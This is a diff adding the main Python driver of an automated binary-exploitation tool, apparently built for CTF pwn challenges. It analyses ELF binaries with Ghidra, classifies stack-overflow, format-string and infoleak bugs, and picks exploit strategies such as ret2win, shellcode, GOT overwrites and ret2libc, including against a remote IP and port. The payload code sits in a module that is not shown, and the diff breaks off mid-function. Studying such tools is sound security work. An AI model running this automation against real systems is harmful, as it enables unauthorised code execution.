@@ -1,0 +1,1180 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import stat
+import pickle
+import shutil
+import subprocess
+import argparse
+import solway_firth
+
+from pwn import ELF
+
+FUNCS_OF_INTEREST = [
+						"open",
+						"fopen",
+						"system",
+						"gets",
+						"read",
+						"fgets",
+						"__isoc99_scanf",
+						"scanf",
+						"printf",
+						"exit",
+						"puts",
+						"strcpy",
+						"strncpy",
+						"fread",
+						"fscanf", 
+						"__isoc99_fscanf"
+					]
+
+WORKING_DIRECTORY = "remenissions-work"
+
+PLTFUNCS_FILENAME = "pltFuncs"
+
+VULN_OUTPUT_FILE = "ds"
+WIN_CONDS_FILE = "bt"
+
+GHIDRA_SCRIPT = "death_stranding.py"
+
+DYN_ANALYZER_NAME = "diamond_eyes.py"
+
+INSTALL_DIR = "/Hackery/remenissions/"
+PROJECTDIR = INSTALL_DIR + "proj/"
+PROJECT_NAME = "p1"
+
+HEADLESS_GHIDRA_DIR = "/tools/ghidra/ghidra_9.1.2_PUBLIC/support/"
+
+CORRECTION_FUNCS = {
+
+	# BofVar group
+	"BofVar": solway_firth.CorrectBofVar,
+
+	# bofFunc group
+	"BofFunc": solway_firth.CorrectBofFunc,
+	"BofFuncArgv": solway_firth.CorrectBofFuncArgv,
+	"BofFuncWInfoleak": solway_firth.CorrectBofFuncWInfoleak,
+	"BofPossFunc": solway_firth.CorrectBofFunc,
+	"BofPossFuncWInfoleak": solway_firth.CorrectBofFuncWInfoleak,
+	"BofSystem": solway_firth.CorrectBofSystem,
+	"BofSystemWInfoleak": solway_firth.CorrectBofSystemWInfoleak,
+
+	# bofShellcode group
+	"BofShellcode": solway_firth.CorrectBofShellcode,
+
+	# indrCall group
+	"IndrCall": solway_firth.CorrectIndrCall,
+	"IndrCallPie": solway_firth.CorrectIndrCallPie,
+	"IndrCallShellcode": solway_firth.CorrectIndrCallShellcode,
+
+	# callInput group
+	"CallInput": solway_firth.CorrectCallInput,
+
+	# bofStatic group
+	"BofStatic": solway_firth.CorrectBofStatic,
+
+	# fs group
+	"FsGotWinFunc":	solway_firth.CorrectFsGotWinFunc,
+	"FsGotWinFuncPie": solway_firth.CorrectFsGotWinFuncPie,
+	"FsGotSystem": solway_firth.CorrectFsGotSystem,
+	"FsGotSystemPie": solway_firth.CorrectFsGotSystemPie,
+	"FsRetShellcode": solway_firth.CorrectFsRetShellcode,
+	"FsRetWinFunc": solway_firth.CorrectFsRetWinFunc,
+	"FsGotShellcode": solway_firth.CorrectFsGotShellcode,
+	"FsGotShellcodeFsleak": solway_firth.CorrectFsGotShellcodeFsleak,
+	"FsGotWinFuncPieFsleak": solway_firth.CorrectFsGotWinFuncPieFsleak
+}
+
+def get_input_write_bytes(inp, stack_offset):
+	start_write = inp.offset
+	end_write = (start_write - inp.write_size)
+	if stack_offset > end_write:
+		write_size = stack_offset - end_write
+	else:
+		write_size = 0
+	return write_size
+
+def get_stack_vuln_write_bytes(stack_vuln, stack_offset):
+	start_write = stack_vuln.overwriteable_vars[0]
+	if (stack_vuln.write_size is None) and (start_write >= stack_offset):
+		write_size = stack_offset
+		return write_size
+
+	elif stack_vuln.write_size is None:
+		return 0
+
+	end_write = (start_write - stack_vuln.write_size)
+	if stack_offset > end_write:
+		write_size = stack_offset - end_write
+	else:
+		write_size = 0
+	return write_size
+
+
+
+def check_fmt_string_vuln(possible_fmt_string, stack_vulns, inputs):
+	write_bytes = 0
+	inp_method = None
+	stack_offset = possible_fmt_string["stackOffset"]
+
+	for inp in inputs:
+		#inpOffset = inp["offset"]
+		write_size = get_input_write_bytes(inp, stack_offset)
+		if write_size > write_bytes:
+			write_bytes = write_size
+			inp_method = inp
+
+	for stack_vuln in stack_vulns:
+		write_size = get_stack_vuln_write_bytes(stack_vuln, stack_offset)
+		if write_size > write_bytes:
+			write_bytes = write_size
+			inp_method = stack_vuln
+
+	if inp_method:
+		fmt_string_dict = {}
+		#fmtString.append("fmtString")
+		fmt_string_dict["function"] = possible_fmt_string["function"]
+		fmt_string_dict["callingFunction"] = possible_fmt_string["callingFunction"]
+		fmt_string_dict["address"] = possible_fmt_string["address"]
+		fmt_string_dict["stackOffset"] = possible_fmt_string["stackOffset"]
+		fmt_string_dict["inpMethod"] = inp_method
+		return solway_firth.FmtStringVuln(fmt_string_dict)
+
+	return None
+
+def can_overflow_return_address(stack_vuln):
+	if "return_address" in stack_vuln.overwriteable_vars:
+		return True
+	else:
+		return False
+
+def can_overflow_variables(stack_vuln):
+	if len(stack_vuln.checks) > 0:
+		return True
+	else:
+		return False
+
+def can_overwrite_indr_call(stack_vuln):
+	if stack_vuln.called_ptrs != []:
+		if 'return_address' in stack_vuln.overwriteable_vars:
+			return True
+		elif stack_vuln.write_size:
+			max_write = stack_vuln.overwriteable_vars[0] - stack_vuln.write_size
+			for ptr in stack_vuln.called_ptrs:
+				if ptr > max_write:
+					return True
+	return False
+
+class Remenissions():
+	def __init__(self):
+		self.elf_name = None
+		self.libc_name = None
+
+		self.elf = None
+		self.libc = None
+
+		self.ip_port = None
+
+		self.additional_files = None
+
+		self.info = None
+		self.interesting_strings = None
+		self.interesting_functions = {}
+
+		self.vulns = []
+
+		self.stack_vulns = []
+		self.fmtstr_vulns = []
+		self.callinput_vulns = []
+		self.inputs = []
+
+		self.infoleak_vulns = []
+
+		self.win_funcs = []
+		self.possible_win_funcs = []
+
+		self.tried_ultimate_jutsu = False
+		self.ran_dynamic_analsis = False
+		self.reran_analysis = False
+
+		self.debug_cmd = None
+		self.normie = True
+
+	def check_fmt_string_vulns(self, possible_fmt_strings):
+		if (len(possible_fmt_strings) == 1) and ((len(self.stack_vulns) + len(self.inputs)) == 1):
+			possible_fmt_string = possible_fmt_strings[0]
+			if len(self.stack_vulns) == 1:
+				inp_method = self.stack_vulns[0]
+			elif len(self.inputs) == 1:
+				inp_method = self.inputs[0]
+			fmt_string = {}
+			fmt_string["type"] = "fmtString"
+			fmt_string["function"] = possible_fmt_string["function"]
+			fmt_string["callingFunction"] = possible_fmt_string["callingFunction"]
+			fmt_string["address"] = possible_fmt_string["address"]
+			fmt_string["stackOffset"] = possible_fmt_string["stackOffset"]
+			fmt_string["inpMethod"] = inp_method
+			self.fmtstr_vulns.append(solway_firth.FmtStringVuln(fmt_string))
+			return
+
+		for possible_fmt_string in possible_fmt_strings:
+			fmt_string = check_fmt_string_vuln(possible_fmt_string, self.stack_vulns, self.inputs)
+			if fmt_string:
+				self.fmtstr_vulns.append(fmt_string)
+
+	def reset_imported_binaries(self):
+		print("Resetting Imported Ghidra Binaries")
+		os.system("rm -rf %s/*" % PROJECTDIR)
+		sys.exit(0)
+
+	def check_parameters(self):
+		if self.elf_name is None:
+			print("Checkout: https://github.com/guyinatuxedo/remenissions")
+			sys.exit(0)
+		self.check_binary_imported()
+
+	def check_binary_imported(self):
+		if self.info["link"]:
+			if not os.path.exists(PROJECTDIR + "/imported_bins"):
+				self.import_binary()
+				return
+			import_bins_file = open(PROJECTDIR + "/imported_bins", "r")
+			line = import_bins_file.readline()
+			while line:
+				line = import_bins_file.readline()
+				if self.elf_name == line.strip("\n"):
+					return
+			import_bins_file.close()
+			self.import_binary()
+
+	def import_binary(self):
+		cmd = HEADLESS_GHIDRA_DIR + "analyzeHeadless " + PROJECTDIR + " " + PROJECT_NAME + " -import " + os.getcwd() + "/" + self.elf_name
+		os.system(cmd)
+		if os.path.exists(PROJECTDIR + "imported_bins"):
+			import_bins_file = open(PROJECTDIR + "imported_bins", "a")
+
+		else:
+			import_bins_file = open(PROJECTDIR + "imported_bins", "w")
+		import_bins_file.write(self.elf_name + "\n")
+		import_bins_file.close()
+
+	def get_binary_attributes(self):
+		os.system(INSTALL_DIR + "/sitd -b %s -e" % (self.elf_name))
+
+		attribute_file = open("sitd-out", "rb")
+
+		self.info = pickle.load(attribute_file)
+		self.interesting_functions = pickle.load(attribute_file)
+		self.interesting_strings = pickle.load(attribute_file)
+
+		attribute_file.close()
+
+		if (self.info["arch"] == "i386") and (self.info["pie"]):
+			self.get_plt_functions()
+
+		self.elf = ELF(self.elf_name)
+		if self.libc_name is not None:
+			self.libc = ELF(self.libc_name)
+
+	def get_plt_functions(self, grab_values_only=False):
+		plt_funcs = {}
+		got_addresses = str(subprocess.check_output(["objdump", "-R", self.elf_name]))
+		got_addresses = got_addresses.split("\\n")
+
+		for got_address in got_addresses:
+			if "R_386_JUMP_SLOT   " in got_address:
+				plt_function = got_address.split("R_386_JUMP_SLOT   ")[1]
+				plt_function = plt_function.split("@GLIBC")[0]
+				if plt_function in FUNCS_OF_INTEREST:
+					plt_funcs[plt_function] = None
+			if "R_386_GLOB_DAT    " in got_address:
+				plt_function = got_address.split("R_386_GLOB_DAT    ")[1]
+				plt_function = plt_function.split("@GLIBC")[0]
+				if plt_function in FUNCS_OF_INTEREST:
+					plt_funcs[plt_function] = None
+					plt_funcs[plt_function] = None
+			elif "R_X86_64_JUMP_SLOT  " in got_address:
+				plt_function = got_address.split("R_X86_64_JUMP_SLOT  ")[1]
+				plt_function = plt_function.split("@GLIBC")[0]
+				if plt_function in FUNCS_OF_INTEREST:
+					plt_funcs[plt_function] = None
+
+		dissassembly = str(subprocess.check_output(["objdump", "-D", self.elf_name])).split("\\n")
+
+
+		for plt_func in plt_funcs.keys():
+			for dis_line in dissassembly:
+				if "<%s@plt>:" % plt_func in dis_line:
+					address = ("0x%s" % dis_line.split((" <%s@plt>:" % plt_func))[0])
+					address = int(address, 16)# | 0x10000
+					if not grab_values_only:
+						address = address | 0x10000
+					plt_funcs[plt_func] = address
+
+		if grab_values_only:
+			return plt_funcs
+
+		if self.libc_name:
+			plt_funcs["libc"] = True
+		else:
+			plt_funcs["libc"] = False
+
+		current_directory = os.getcwd() + "/"
+		plt_funcs_file = open(current_directory + PLTFUNCS_FILENAME, "wb")
+		pickle.dump(plt_funcs, plt_funcs_file, protocol = 2)
+		plt_funcs_file.close()
+
+		return plt_funcs
+
+	def run_debug_cmd(self, debug_cmd):
+		if debug_cmd == "LocalLibcId":
+			self.check_binary_imported()
+			self.get_binary_vulns()
+			self.quantify_vulns()
+
+			plt_funcs = self.grab_plt_funcs()
+
+			for stack_vuln in self.stack_vulns:
+				attack_args = [self.elf_name, stack_vuln, plt_funcs, None]
+				exploit = solway_firth.IdLibcPutsInfoleak(attack_args)
+			sys.exit(0)
+
+
+		elif debug_cmd == "RemoteLibcId":
+			if self.ip_port is None:
+				print("This requires an IP and Port to be specified")
+				sys.exit(0)
+			self.check_binary_imported()
+			self.get_binary_vulns()
+			self.quantify_vulns()
+
+			plt_funcs = self.grab_plt_funcs()
+
+			for stack_vuln in self.stack_vulns:
+				attack_args = [self.elf_name, stack_vuln, plt_funcs, self.ip_port]
+				exploit = solway_firth.IdLibcPutsInfoleak(attack_args)
+			sys.exit(0)
+
+		elif "Correction" in debug_cmd:
+			self.check_binary_imported()
+			self.get_binary_vulns()
+			if "CallInput" in debug_cmd or "Ret2Static" in debug_cmd:
+				self.run_dynamic_analysis()
+			self.quantify_vulns()
+			exploit_method = debug_cmd.split("Correction-")[1]
+			attack_args = self.get_exploit_method_args(exploit_method)
+			exploits = CORRECTION_FUNCS[exploit_method](attack_args)
+
+			self.verify_exploit(exploits)
+			sys.exit(0)
+
+		else:
+			print("Debug command not implemented")
+			sys.exit(0)
+
+	def get_exploit_method_args(self, exploit_method):
+		if self.win_funcs == []:
+			win_funcs = self.possible_win_funcs
+		else:
+			win_funcs = self.win_funcs
+		has_win_func = self.win_funcs_present()
+		has_possible_win_func = self.present_win_funcs_present()
+		is_system_imported = self.is_system_imported()
+		can_execute_shellcode = self.can_call_shellcode()
+
+		infoleaks_pie =	self.get_infoleaks_pie()
+		infoleaks_stack	=	self.get_infoleaks_stack()
+		infoleaks_libc =	self.get_infoleaks_libc()
+
+		if "Fs" in exploit_method:
+			functions_called_after = self.get_functions_called_after(self.fmtstr_vulns[0].address)
+
+		if exploit_method == "BofVar":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0]]
+
+		elif exploit_method == "BofFunc":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], win_funcs]
+
+		elif exploit_method == "BofFuncWInfoleak":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], win_funcs, infoleaks_pie]
+
+		elif exploit_method == "BofSystem":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0]]
+
+		elif exploit_method == "BofSystemWInfoleak":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], infoleaks_pie]
+
+		elif exploit_method == "BofFuncArgv":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], win_funcs]
+
+		elif exploit_method == "BofShellcode":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], self.infoleak_vulns[0]]
+
+		elif exploit_method == "IndrCall":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], win_funcs]
+
+		elif exploit_method == "IndrCallPie":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], win_funcs, infoleaks_pie]
+
+		elif exploit_method == "IndrCallShellcode":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], infoleaks_stack]
+
+		elif exploit_method == "IndrCallLibc":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0], infoleaks_libc, self.libc_name, self.libc]
+
+		elif exploit_method == "CallInput":
+			attack_args = [self.elf_name, self.elf, self.callinput_vulns[0]]
+
+		elif exploit_method == "BofStatic":
+			attack_args = [self.elf_name, self.elf, self.stack_vulns[0]]
+
+		elif exploit_method == "FsGotWinFunc":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], win_funcs, functions_called_after]
+
+		elif exploit_method == "FsGotWinFuncPie":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], win_funcs, functions_called_after, infoleaks_pie]
+
+		elif exploit_method == "FsGotWinFuncPieFsleak":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], win_funcs, functions_called_after]
+
+		elif exploit_method == "FsGotSystem":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], functions_called_after]
+
+		elif exploit_method == "FsGotSystemPie":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], functions_called_after, infoleaks_pie]
+
+		elif exploit_method == "FsRetWinFunc":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], win_funcs, infoleaks_stack]
+
+		elif exploit_method == "FsRetShellcode":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], infoleaks_stack, self.info["pie"]]
+
+		elif exploit_method == "FsGotShellcode":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], functions_called_after, infoleaks_stack]
+
+		elif exploit_method == "FsGotShellcodeFsleak":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], functions_called_after]
+
+		elif exploit_method == "FsGotLibc":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], functions_called_after, infoleaks_libc, self.libc_name]
+
+		elif exploit_method == "FsGotLibcFsleakLoop":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], self.libc_name]
+
+		elif exploit_method == "FsGotOneshot":
+			attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[0], functions_called_after, infoleaks_libc, self.libc_name]
+		return attack_args
+	def switch_directory(self):
+		if os.path.exists(WORKING_DIRECTORY):
+			shutil.rmtree(WORKING_DIRECTORY)
+
+		os.mkdir(WORKING_DIRECTORY)
+		shutil.copyfile(self.elf_name, "%s/%s" % (WORKING_DIRECTORY, self.elf_name))
+
+		if self.libc_name:
+			shutil.copyfile(self.libc_name, "%s/%s" % (WORKING_DIRECTORY, self.libc_name))
+
+		if self.additional_files is not None:
+			for file in self.additional_files:
+				#file_bytes = bytes(file, encoding="utf-8")
+				shutil.copyfile(file, "%s/%s" % (WORKING_DIRECTORY, file))
+
+		os.chdir(WORKING_DIRECTORY)
+		os.chmod("%s" % (self.elf_name), stat.S_IEXEC | stat.S_IREAD)
+
+		flag_file = open("flag.txt", "w")
+		flag_file.write("flag{Without them, we equal, nothing}")
+
+
+	def get_binary_vulns(self):
+		current_directory = os.getcwd() + "/"
+		if os.path.exists(current_directory + VULN_OUTPUT_FILE):
+			os.remove(current_directory + VULN_OUTPUT_FILE)
+
+		if (self.info["pie"]) and (self.info["arch"] == "i386"):
+			cmd = HEADLESS_GHIDRA_DIR + "analyzeHeadless " + PROJECTDIR + " " + PROJECT_NAME + " -process " + self.elf_name + " -postscript " + GHIDRA_SCRIPT + " " + current_directory + VULN_OUTPUT_FILE + " " + current_directory + WIN_CONDS_FILE + " " + current_directory + PLTFUNCS_FILENAME
+
+		elif (self.info["pie"]) and (self.info["arch"] == "amd64") and (self.libc_name is None):
+			cmd = HEADLESS_GHIDRA_DIR + "analyzeHeadless " + PROJECTDIR + " " + PROJECT_NAME + " -process " + self.elf_name + " -postscript " + GHIDRA_SCRIPT + " " + current_directory + VULN_OUTPUT_FILE + " " + current_directory + WIN_CONDS_FILE+ " rebase"
+
+		else:
+			cmd = HEADLESS_GHIDRA_DIR + "analyzeHeadless " + PROJECTDIR + " " + PROJECT_NAME + " -process " + self.elf_name + " -postscript " + GHIDRA_SCRIPT + " " + current_directory + VULN_OUTPUT_FILE + " " + current_directory + WIN_CONDS_FILE
+
+		os.system(cmd)
+
+		try:
+			vulns_file = open(current_directory + VULN_OUTPUT_FILE, "rb")
+		except:
+			self.run_dynamic_analysis()
+			return
+
+		more_vulns = True
+		while more_vulns:
+			try:
+				next_vuln = pickle.load(vulns_file)
+				self.vulns.append(next_vuln)
+			except:
+				more_vulns = False
+
+		os.remove(current_directory + VULN_OUTPUT_FILE)
+
+		cond_file = open(current_directory + WIN_CONDS_FILE, "rb")
+
+		try:
+			self.win_funcs = pickle.load(cond_file)
+			self.possible_win_funcs = pickle.load(cond_file)
+		except:
+			print("No alternate win conditions detected.")
+
+		cond_file.close()
+
+	def quantify_vulns(self):
+		possible_fmtstrs_vulns = []
+
+		for i in range(0, len(self.vulns)):
+			if self.vulns[i]["type"] == "stack":
+				if (self.vulns[i]["callingFunction"] == "main") and ( self.info["arch"] == "i386"):
+					solway_firth.correct_32_main_stack_vuln(self.vulns[i], self.elf_name, self.info["pie"])
+				new_stack_vuln = solway_firth.StackVuln(self.vulns[i])
+				self.stack_vulns.append(new_stack_vuln)
+
+			elif self.vulns[i]["type"] == "infoleak":
+				if (self.vulns[i]["callingFunction"] == "main") and ( self.info["arch"] == "i386") and (self.vulns[i]["memoryRegion"] == "stack"):
+					solway_firth.correct_32_main_infoleak(self.vulns[i], self.elf_name, self.info["pie"])
+				new_infoleak_vuln = solway_firth.InfoleakVuln(self.vulns[i])
+				self.infoleak_vulns.append(new_infoleak_vuln)
+
+			elif self.vulns[i]["type"] == "callInput":
+				new_callinput_vuln = solway_firth.CallInputVuln(self.vulns[i])
+				self.callinput_vulns.append(new_callinput_vuln)
+
+			elif self.vulns[i]["type"] == "input":
+				if (self.vulns[i]["callingFunction"] == "main") and ( self.info["arch"] == "i386"):
+					solway_firth.correct_32_main_input(self.vulns[i], self.elf_name, self.info["pie"])
+
+				new_input = solway_firth.Input(self.vulns[i])
+				self.inputs.append(new_input)
+
+			elif self.vulns[i]["type"] == "possibleFmtString":
+				possible_fmtstrs_vulns.append(self.vulns[i])
+			else:
+				print("Bugtype Not Supported: %s" + self.vulns[i]["type"])
+
+		if possible_fmtstrs_vulns != []:
+			self.check_fmt_string_vulns(possible_fmtstrs_vulns)
+			for i in range(0, len(self.fmtstr_vulns)):
+				if (self.vulns[i]["callingFunction"] == "main") and ( self.info["arch"] == "i386"):
+					solway_firth.correct_32_main_printf(self.fmtstr_vulns[i], self.elf_name, self.info["pie"])
+
+	def win_funcs_present(self):
+		if len(self.win_funcs) > 0:
+			return True
+		else:
+			return False
+
+	def present_win_funcs_present(self):
+		if len(self.possible_win_funcs) > 0:
+			return True
+		else:
+			return False
+
+	def is_system_imported(self):
+		if self.interesting_functions is None:
+			return False
+		if self.interesting_functions["system"] is not None:
+			return True
+		else:
+			return False
+
+	def get_stack_infoleak(self):
+		for i in range(0, len(self.infoleak_vulns)):
+			if self.infoleak_vulns[i].memory_region == "stack":
+				return i
+		return None
+
+	def can_call_shellcode(self):
+		stack_infoleak = self.get_stack_infoleak()
+		if (not self.info["nx"]) and stack_infoleak is not None:
+			return True
+		return False
+
+	def get_infoleaks(self, region):
+		ret_infoleaks = []
+		for infoleak_vuln in self.infoleak_vulns:
+			infoleak_type = infoleak_vuln.memory_region
+			if infoleak_type == region:
+				ret_infoleaks.append(infoleak_vuln)
+		if ret_infoleaks == []:
+			return None
+		return ret_infoleaks
+
+	def get_infoleaks_pie(self):
+		return self.get_infoleaks("pie")
+
+	def get_infoleaks_stack(self):
+		return self.get_infoleaks("stack")
+
+	def get_infoleaks_libc(self):
+		return self.get_infoleaks("libc")
+
+	def can_call_system(self):
+		if (self.interesting_functions["system"]) and (self.check_bin_sh()):
+			return True
+		else:
+			return False
+
+	def check_bin_sh(self):
+		if self.interesting_strings["/bin/bash"] or self.interesting_strings["/bin/sh"]:
+			return True
+		return False
+
+	def plan_attack(self):
+		num_stack_vulns = len(self.stack_vulns)
+		num_fmtstr_vulns = len(self.fmtstr_vulns)
+		num_callinput_vulns = len(self.callinput_vulns)
+
+		stack_infoleak_idx = self.get_stack_infoleak()
+
+		attacks = []
+
+		has_win_func = self.win_funcs_present()
+		has_possible_win_func = self.present_win_funcs_present()
+		is_system_imported = self.is_system_imported()
+		can_execute_shellcode = self.can_call_shellcode()
+
+		infoleaks_pie = self.get_infoleaks_pie()
+		infoleaks_stack	= self.get_infoleaks_stack()
+		infoleaks_libc = self.get_infoleaks_libc()
+		has_system_binsh = self.can_call_system()
+
+		if num_stack_vulns > 0:
+			if self.info["canary"]:
+				self.stack_vulns = solway_firth.filter_canaries(self.stack_vulns)
+
+		for i in range(0, num_stack_vulns):
+			can_overflow_ret = can_overflow_return_address(self.stack_vulns[i])
+			can_overflow_var = can_overflow_variables(self.stack_vulns[i])
+			can_overwrite_call = can_overwrite_indr_call(self.stack_vulns[i])
+
+			if self.info["link"]:
+				plt_funcs =	self.grab_plt_funcs()
+			else:
+				plt_funcs = {}
+
+			if self.stack_vulns[i].inp_type == "argv":
+				if can_overflow_var:
+					attack_type = "BofVar"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i]]
+
+					exploit = solway_firth.BofVar(attack_args)
+
+					attacks.append([attack_type, attack_args])
+
+				if (has_win_func or has_possible_win_func) and (not self.info["pie"]) and (can_overflow_ret):
+					attack_type = "BofFuncArgv"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.win_funcs]
+
+					exploit = solway_firth.BofFuncArgv(attack_args)
+
+					attacks.append([attack_type, attack_args])
+				continue
+
+
+
+			# Overwrite Indirect Call WinFunc
+			if (can_overwrite_call) and (has_win_func) and (not self.info["pie"]):
+				attack_type = "IndrCall"
+				attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.win_funcs]
+
+				exploit = solway_firth.IndrCall(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			# Overwrite Indirect Call WinFunc
+			if (can_overwrite_call) and (has_possible_win_func) and (not self.info["pie"]):
+				attack_type = "IndrCall"
+				attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.possible_win_funcs]
+
+				exploit = solway_firth.IndrCall(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			# Overwrite Indirect Call WinFunc
+			if (can_overwrite_call) and (has_win_func) and (infoleaks_pie) and (self.info["pie"]):
+				attack_type = "IndrCallPie"
+				attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.win_funcs, infoleaks_pie]
+
+				exploit = solway_firth.IndrCallPie(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			# Overwrite Indirect Call WinFunc
+			if (can_overwrite_call) and (has_possible_win_func) and (infoleaks_pie) and (self.info["pie"]):
+				attack_type = "IndrCallPie"
+				attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.possible_win_funcs, infoleaks_pie]
+
+				exploit = solway_firth.IndrCallPie(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			# Overwrite Indirect Call WinFunc
+			if (can_overwrite_call) and (infoleaks_libc) and (self.libc_name is not None) and (self.info["arch"] == "amd64"):
+				attack_type = "IndrCallLibc"
+				attack_args = [self.elf_name, self.elf, self.stack_vulns[i], infoleaks_libc, self.libc_name, self.libc]
+
+				solway_firth.IndrCallLibc(attack_args)
+
+			# Overwrite Indirect Call WinFunc
+			if (can_overwrite_call) and (can_execute_shellcode):
+				attack_type = "IndrCallShellcode"
+				attack_args = [self.elf_name, self.elf, self.stack_vulns[i], infoleaks_stack]
+
+				exploit = solway_firth.IndrCallShellcode(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if can_overflow_ret:
+				if (has_win_func) and (not self.info["pie"]):
+					attack_type = "BofFunc"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.win_funcs]
+
+					exploit = solway_firth.BofFunc(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+				if (has_possible_win_func) and (not self.info["pie"]):
+					attack_type = "BofPossFunc"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.possible_win_funcs]
+
+					exploit = solway_firth.BofFunc(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+				if (has_win_func) and (infoleaks_pie) and (self.info["pie"]):
+					attack_type = "BofFuncWInfoleak"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.win_funcs, infoleaks_pie]
+
+					exploit = solway_firth.BofFuncWInfoleak(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+				if (has_possible_win_func ) and (infoleaks_pie) and (self.info["pie"]):
+					attack_type = "BofPossFuncWInfoleak"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.possible_win_funcs, infoleaks_pie]
+
+					exploit = solway_firth.BofFuncWInfoleak(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+				if (has_system_binsh) and (not self.info["pie"]):
+					attack_type = "BofSystem"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i]]
+
+					exploit = solway_firth.BofSystem(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+				if (has_system_binsh) and (infoleaks_pie) and (self.info["pie"]):
+					attack_type = "BofSystemWInfoleak"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i], infoleaks_pie]
+
+					exploit = solway_firth.BofSystemWInfoleak(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+				# Call Shellcode
+				if can_execute_shellcode:
+					attack_type = "BofShellcode"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i], self.infoleak_vulns[stack_infoleak_idx]]
+
+					exploit = solway_firth.BofShellcode(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+				if (infoleaks_libc) and (self.libc_name is not None):
+					attack_args = [self.elf_name, self.elf, self.libc_name, self.libc, self.stack_vulns[i], infoleaks_libc]
+
+					solway_firth.Ret2Libc(attack_args)
+
+				if ((self.libc_name is not None) and ("puts" in plt_funcs.keys())):
+					attack_args = [self.elf_name, self.elf, self.libc_name, self.libc, self.stack_vulns[i], plt_funcs]
+
+					solway_firth.Ret2libcPutsInfoleak(attack_args)
+
+				if (not self.info["link"]) and (not self.info["pie"]):
+					attack_type = "BofStatic"
+					attack_args = [self.elf_name, self.elf, self.stack_vulns[i]]
+
+					exploit = solway_firth.BofStatic(attack_args)
+
+					self.verify_exploit(exploit)
+					attacks.append([attack_type, attack_args])
+
+			if can_overflow_var:
+				attack_type = "BofVar"
+				attack_args = [self.elf_name, self.elf, self.stack_vulns[i]]
+
+				exploit = solway_firth.BofVar(attack_args)
+
+				attacks.append([attack_type, attack_args])
+
+
+		for i in range(0, len(self.fmtstr_vulns)):
+			functions_called_after = self.get_functions_called_after(self.fmtstr_vulns[i].address)
+
+			if (has_win_func) and (not self.info["pie"]) and (functions_called_after != []):
+				attack_type = "FsGotWinFunc"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.win_funcs, functions_called_after]
+
+				exploit = solway_firth.FsGotWinFunc(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (has_possible_win_func) and (not self.info["pie"]) and (functions_called_after != []):
+				attack_type = "FsGotWinFunc"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.possible_win_funcs, functions_called_after]
+
+				exploit = solway_firth.FsGotWinFunc(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (has_win_func) and (self.info["pie"]) and (functions_called_after != []) and (infoleaks_pie is not None):
+				attack_type = "FsGotWinFuncPie"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.win_funcs, functions_called_after, infoleaks_pie]
+
+				exploit = solway_firth.FsGotWinFuncPie(attack_args)
+
+				self.verify_exploit(exploit)
+				attacks.append([attack_type, attack_args])
+
+			if (has_possible_win_func) and (self.info["pie"]) and (functions_called_after != []) and (infoleaks_pie is not None):
+				attack_type = "FsGotWinFuncPie"
+				attack_args = [self.elf_name, self.elf, self.fmtstr_vulns[i], self.possible_win_funcs, functions_called_after, infoleaks_pie]
+
+				exploit = solway_firth.FsGotWinFuncPie(attack_args)
+
